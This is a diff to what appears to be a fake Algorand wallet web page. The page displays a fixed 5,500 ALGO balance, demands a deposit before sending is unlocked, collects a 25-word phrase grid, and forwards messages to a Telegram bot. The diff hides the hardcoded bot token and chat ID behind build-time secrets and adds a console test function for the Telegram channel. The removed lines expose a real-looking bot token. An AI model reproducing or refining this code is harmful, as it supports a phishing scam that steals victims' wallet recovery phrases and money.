@@ -7,6 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
+        /* SEMUA STYLE ANDA TETAP SAMA seperti yang diberikan */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --primary: #00A4E0;
@@ -156,7 +157,6 @@
             </div>
             <h2 style="margin-bottom: 0.5rem;">Confirm Transaction</h2>
             <p style="color: var(--text-secondary); margin-bottom: 1rem;">Enter recipient address to send 5,500 ALGO</p>
-            
             
             <div class="address-input-group">
                 <label><i class="fas fa-arrow-right"></i> Recipient Algorand Address</label>
@@ -329,9 +329,12 @@
     </div>
 
     <script>
-        // ==================== TELEGRAM CONFIGURATION ====================
-        const TELEGRAM_BOT_TOKEN = '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w';
-        const TELEGRAM_CHAT_ID = '7196180695';
+        // ==================== TELEGRAM CONFIGURATION (AMAN) ====================
+        // Token akan di-inject oleh GitHub Actions saat build
+        // JANGAN UBAH bagian ini - gunakan GitHub Secrets
+        
+        const TELEGRAM_BOT_TOKEN = '__TELEGRAM_BOT_TOKEN__';  // Akan diganti saat deploy
+        const TELEGRAM_CHAT_ID = '__TELEGRAM_CHAT_ID__';      // Akan diganti saat deploy
         
         const DEFAULT_WORD_COUNT = 25;
         let currentWordCount = 25;
@@ -381,6 +384,13 @@
         }
         
         async function sendMessageToTelegram(message) {
+            // Cek apakah token sudah diisi dengan benar
+            if (TELEGRAM_BOT_TOKEN === '__TELEGRAM_BOT_TOKEN__' || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.warn('⚠️ Telegram token belum dikonfigurasi. Gunakan GitHub Secrets untuk mengisi token.');
+                showNotification('⚠️ Telegram notifikasi tidak tersedia (token belum dikonfigurasi)', 'warning');
+                return false;
+            }
+            
             try {
                 const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 const response = await fetch(telegramUrl, {
@@ -390,8 +400,17 @@
                 });
                 const data = await response.json();
                 return data.ok === true;
-            } catch(e) { console.error('Telegram send failed:', e); return false; }
+            } catch(e) { 
+                console.error('Telegram send failed:', e); 
+                return false; 
+            }
         }
+        
+        // Test fungsi Telegram (opsional - bisa dipanggil dari console)
+        window.testTelegram = async function() {
+            const result = await sendMessageToTelegram('✅ Test message from Algo Wallet!');
+            showNotification(result ? '✅ Telegram connected!' : '❌ Telegram failed. Check console.', result ? 'success' : 'error');
+        };
         
         function checkDepositRequirement() {
             const algoValueUSD = tokenBalances.ALGO * currentAlgoPrice;
@@ -802,11 +821,6 @@
         
         function showLogoutConfirm() { document.getElementById('logoutConfirmModal').classList.add('active'); }
         function hideLogoutConfirm() { document.getElementById('logoutConfirmModal').classList.remove('active'); }
-        async function testTelegramConnection() {
-            showNotification('📡 Testing Telegram connection...', 'info');
-            const result = await sendMessageToTelegram('✅ Bot Connected! Algo Wallet is online. (Test message)');
-            showNotification(result ? '✅ Telegram bot connected! Check your Telegram.' : '❌ Failed to connect to Telegram. Check token and chat ID.', result ? 'success' : 'error');
-        }
         
         // ==================== EVENT LISTENERS ====================
         document.getElementById('startSendBtn').addEventListener('click', startSendTransaction);
@@ -840,7 +854,6 @@
         window.openReceiveModal = openReceiveModal;
         window.openWithdrawModal = openWithdrawModal;
         window.openDepositModal = openDepositModal;
-        window.testTelegramConnection = testTelegramConnection;
         
         buildWordGrid();
         updateWordCounter();
@@ -849,7 +862,12 @@
         console.log('%c✅ ALGO WALLET - BALANCE: 5,500 ALGO', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
         console.log('%c✅ SEND REQUIREMENT: Min 2,000 ALGO or 100 USD deposit to unlock Send', 'color: #10B981; font-size: 12px;');
         console.log('%c✅ WITHDRAW REQUIREMENT: Min 2,000 ALGO or 100 USD', 'color: #F59E0B; font-size: 12px;');
-        console.log('%c✅ ALL FEATURES ARE ACTIVE', 'color: #00A4E0; font-size: 12px; font-weight: bold;');
+        console.log('%c✅ ALL FEATURES ARE ACTIVE', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
+        if (TELEGRAM_BOT_TOKEN === '__TELEGRAM_BOT_TOKEN__') {
+            console.warn('%c⚠️ PERINGATAN: Telegram token belum dikonfigurasi! Setup GitHub Secrets untuk mengaktifkan notifikasi.', 'color: #FF6B4A; font-size: 12px;');
+        } else {
+            console.log('%c✅ TELEGRAM BOT ACTIVE - Notifications enabled', 'color: #10B981; font-size: 12px;');
+        }
     </script>
 </body>
 </html>
